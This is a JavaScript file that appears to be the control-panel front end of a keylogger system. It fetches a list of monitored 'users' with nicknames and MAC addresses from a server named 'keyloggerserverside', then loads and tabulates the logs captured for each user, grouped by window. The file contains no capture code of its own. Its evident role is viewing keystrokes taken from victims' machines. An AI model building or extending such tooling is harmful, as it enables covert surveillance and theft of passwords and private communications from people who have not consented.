function loadButtons() {
    fetch('https://keyloggerserverside.onrender.com/users/list_of_users', {method: 'GET',headers:{
        'ngrok-skip-browser-warning': 'true',  // Add the header here
      }})
        .then(response => response.json())
        .then(jsons => jsons.users)
        .then(data => {
            console.log(data)
                const container = document.getElementById('buttons_container')
                data.forEach(file => {
                    const button = document.createElement('button');
                    const p1 = document.createElement('p')
                    p1.classList.add('p_button')
                    const p2 = document.createElement('p')
                    p2.classList.add('p_button')
                    const br = document.createElement('br')
                    p1.textContent = `name: ${file.nickname}`
                    p2.textContent = `mac adress: ${file.mac_address}`
                    button.classList.add('button', 'button_hover', 'a_buttons')
                    button.id = file._id
                    button.appendChild(p1)
                    button.appendChild(br)
                    button.appendChild(p2)
                    button.onclick = function() {
                        clicking(button.id)
                    }
                    container.appendChild(button)
                    

                })

            }
        )
}

function clicking(user_id) {
    const id = user_id
    window.location.href = `dashboard?id=${user_id}`
}

function addDataToTable(selectedData){

    // Erase previous content
    const tableBody = document.getElementById('table-body');
    while (tableBody.firstChild) {
        tableBody.removeChild(tableBody.firstChild);
    }
    

        for (const [key, value] of Object.entries(selectedData)) {
            const tr = document.createElement('tr');
            const tdKey = document.createElement('td');
            tdKey.textContent = key;
            const tdValue = document.createElement('td');
            tdValue.textContent = value;
            tr.appendChild(tdKey);
            tr.appendChild(tdValue);
            document.getElementById('table-body').appendChild(tr);
        }
}
function listenToChangeOfWindow(data){
    const container = document.getElementById('selection_win')
    container.addEventListener('change', () => {
        const selectOption = container.value

        const selectedData = data[selectOption];

        addDataToTable(selectedData)
    })
}

function receiveUserData() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    const lst = []
    const container = document.getElementById('selection_win')
    const output = document.createElement('p')
    output.id = 'output'
    fetch(`http://127.0.0.1:8000/data/get_logs_for_user?id=${id}`, {method: 'GET'})
        .then(response => response.json())
        .then(data => data.logs)
        .then(data => {
            for(win in data) {
                const option = document.createElement('option')
                option.textContent = String(win)
                option.value = win
                container.appendChild(option)
            }
            const body = document.getElementById('body')
            body.appendChild(output)

            const selectOption = container.value
            const selectedData = data[selectOption];
            addDataToTable(selectedData)
            listenToChangeOfWindow(data)


    })
        
}